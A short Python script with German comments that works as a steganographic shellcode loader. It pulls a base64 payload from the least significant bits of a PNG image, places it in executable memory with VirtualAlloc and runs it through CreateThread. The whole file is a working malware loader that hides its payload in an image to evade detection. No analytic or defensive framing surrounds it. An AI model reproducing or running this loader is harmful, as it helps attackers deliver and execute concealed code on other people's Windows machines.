import base64
from PIL import Image
import ctypes

def extract_bitstring_from_lsb(image_path: str, bit_length: int) -> str:
    """Liest eine Bitfolge aus den LSBs des Bildes."""
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size

    bits = ''
    for y in range(height):
        for x in range(width):
            if len(bits) >= bit_length:
                return bits
            r, g, b = pixels[x, y]
            bits += str(r & 1)
    return bits


def bitstring_to_bytes(bits: str) -> bytes:
    """Wandelt eine Bitfolge in echte Bytes um."""
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))


def decode_base64(data: bytes) -> bytes:
    """Decodiert base64-kodierte Bytes."""
    return base64.b64decode(data)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
# Signatur setzen (nur einmal nötig)
ctypes.windll.kernel32.RtlMoveMemory.argtypes = [
    ctypes.c_void_p,  # Destination
    ctypes.c_void_p,  # Source
    ctypes.c_size_t   # Length
]


def execute_shellcode(shellcode: bytes):
    size = len(shellcode)

    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    ctypes.windll.kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
                                                    ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]

    ptr = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    print(f"[DEBUG] Allocated pointer: {hex(ptr) if ptr else ptr}")
    if not ptr:
        raise OSError("[-] VirtualAlloc failed.")

    buffer = ctypes.create_string_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ptr, buffer, size)

    func_ptr = ctypes.cast(ptr, ctypes.c_void_p)

    thread = ctypes.windll.kernel32.CreateThread(None, 0, func_ptr, None, 0, None)
    ctypes.windll.kernel32.WaitForSingleObject(thread, -1)



# === 🧪 USAGE ===
if __name__ == "__main__":
    BIT_LENGTH = 396 * 8

    bitstring = extract_bitstring_from_lsb("stego_output.png", BIT_LENGTH)
    raw_bytes = bitstring_to_bytes(bitstring)

    print(f"[+] Extracted (Base64): {raw_bytes}")
    decoded = decode_base64(raw_bytes)
    print(f"[+] Decoded Payload: {decoded}")

    # Optional: Payload ausführen (wenn es z.B. Shellcode ist)
    execute_shellcode(decoded)
